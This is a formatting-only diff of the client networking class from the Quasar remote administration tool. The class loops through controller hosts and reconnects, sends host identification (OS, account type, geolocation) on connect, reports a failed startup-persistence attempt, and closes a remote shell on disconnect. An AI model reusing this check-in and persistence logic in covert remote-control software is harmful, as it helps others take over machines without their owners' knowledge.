@@ -11,10 +11,8 @@ using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Utilities;
 
-namespace Quasar.Client.Networking
-{
-    public class QuasarClient : Client
-    {
+namespace Quasar.Client.Networking {
+    public class QuasarClient : Client {
         /// <summary>
         /// When Exiting is true, stop all running threads and exit.
         /// </summary>
@@ -23,8 +21,7 @@ namespace Quasar.Client.Networking
         private readonly HostsManager _hosts;
         private readonly SafeRandom _random;
 
-        public QuasarClient(HostsManager hostsManager) : base()
-        {
+        public QuasarClient(HostsManager hostsManager) : base() {
             this._hosts = hostsManager;
             this._random = new SafeRandom();
             base.ClientState += OnClientState;
@@ -32,12 +29,10 @@ namespace Quasar.Client.Networking
             base.ClientFail += OnClientFail;
         }
 
-        public void Connect()
-        {
+        public void Connect() {
             while (!Exiting) // Main Connect Loop
             {
-                if (!Connected)
-                {
+                if (!Connected) {
                     Thread.Sleep(100 + _random.Next(0, 250));
 
                     Host host = _hosts.GetNextHost();
@@ -55,8 +50,7 @@ namespace Quasar.Client.Networking
                     Thread.Sleep(2500);
                 }
 
-                if (Exiting)
-                {
+                if (Exiting) {
                     Disconnect();
                     return;
                 }
@@ -65,13 +59,10 @@ namespace Quasar.Client.Networking
             }
         }
 
-        private void OnClientRead(Client client, IMessage message)
-        {
-            if (!Identified)
-            {
-                if (message.GetType() == typeof(ClientIdentificationResult))
-                {
-                    var reply = (ClientIdentificationResult) message;
+        private void OnClientRead(Client client, IMessage message) {
+            if (!Identified) {
+                if (message.GetType() == typeof(ClientIdentificationResult)) {
+                    var reply = (ClientIdentificationResult)message;
                     Identified = reply.Result;
                 }
                 return;
@@ -80,24 +71,20 @@ namespace Quasar.Client.Networking
             PacketHandler.HandlePacket(client, message);
         }
 
-        private void OnClientFail(Client client, Exception ex)
-        {
+        private void OnClientFail(Client client, Exception ex) {
             Debug.WriteLine("Client Fail - Exception Message: " + ex.Message);
             client.Disconnect();
         }
 
-        private void OnClientState(Client client, bool connected)
-        {
+        private void OnClientState(Client client, bool connected) {
             Identified = false; // always reset identification
 
-            if (connected)
-            {
+            if (connected) {
                 // send client identification once connected
 
                 GeoLocationHelper.Initialize();
 
-                client.Send(new ClientIdentification
-                {
+                client.Send(new ClientIdentification {
                     Version = Settings.VERSION,
                     OperatingSystem = PlatformHelper.FullName,
                     AccountType = WindowsAccountHelper.GetAccountType(),
@@ -112,28 +99,24 @@ namespace Quasar.Client.Networking
                     Tag = Settings.TAG
                 });
 
-                if (ClientData.AddToStartupFailed)
-                {
+                if (ClientData.AddToStartupFailed) {
                     Thread.Sleep(2000);
-                    client.Send(new SetStatus
-                    {
+                    client.Send(new SetStatus {
                         Message = "Adding to startup failed."
                     });
                 }
             }
-            
+
 
             if (!connected && !Exiting)
                 LostConnection();
         }
 
-        private void LostConnection()
-        {
+        private void LostConnection() {
             CommandHandler.CloseShell();
         }
 
-        public void Exit()
-        {
+        public void Exit() {
             Exiting = true;
             Disconnect();
         }
